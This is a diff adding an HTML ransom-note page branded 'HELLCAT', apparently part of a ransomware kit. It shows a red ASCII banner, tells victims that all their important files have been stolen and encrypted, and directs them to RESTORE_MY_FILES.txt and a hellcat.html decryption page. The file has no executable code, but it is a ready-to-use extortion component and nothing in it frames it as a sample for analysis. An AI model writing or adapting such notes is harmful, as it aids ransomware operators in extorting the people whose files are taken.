@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Files Stolen and Encrypted</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'VCR OSD Mono', monospace;
+            color: #ffffff;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 800px;
+            padding: 20px;
+            background-color: #000000;
+            border: 2px dashed #ff0000;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
+            text-align: center;
+            overflow-y: auto;
+            max-height: 90vh;
+        }
+
+        html {
+            transform: scale(0.9);
+        }
+
+        .ascii-banner {
+            color: #ff0000;
+            margin-bottom: 20px;
+            white-space: pre-wrap;
+            text-shadow: 0 0 8px rgba(255, 0, 0, 1);
+        }
+
+        .info-text {
+            margin-top: 20px;
+            color: #d0d0d0;
+            line-height: 1.6;
+        }
+
+        .info-text a {
+            color: #ff0000;
+            text-decoration: none;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <pre class="ascii-banner">      ██╗  ██╗███████╗██╗     ██╗      ██████╗ █████╗ ████████╗
+      ██║  ██║██╔════╝██║     ██║     ██╔════╝██╔══██╗╚══██╔══╝
+      ███████║█████╗  ██║     ██║     ██║     ███████║   ██║   
+      ██╔══██║██╔══╝  ██║     ██║     ██║     ██╔══██║   ██║   
+      ██║  ██║███████╗███████╗███████╗╚██████╗██║  ██║   ██║   
+      ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   
+        </pre>
+        <div class="info-text">
+            <h1>All your important files have been <strong class="text-warning">stolen and encrypted</strong></h1>
+            <p>For more information, see <strong>RESTORE_MY_FILES.txt</strong> that is located in every encrypted folder.</p>
+            <p>If you are willing to decrypt and restore your files, check <a href="hellcat.html">hellcat.html</a>.</p>
+        </div>
+    </div>
+</body>
+</html>
